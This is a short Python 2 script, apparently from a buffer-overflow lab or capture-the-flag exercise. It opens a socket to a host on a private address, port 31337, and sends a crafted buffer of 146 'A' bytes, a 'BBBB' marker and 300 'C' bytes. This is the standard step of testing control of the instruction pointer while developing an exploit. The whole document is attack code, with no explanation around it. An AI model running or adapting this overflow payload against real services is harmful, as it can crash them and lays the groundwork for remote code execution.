#!/usr/bin/env python2
import socket

RHOST = "192.168.56.112"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A" * 146 + "BBBB" + "C" * 300 
buf += "\n"

s.send(buf)
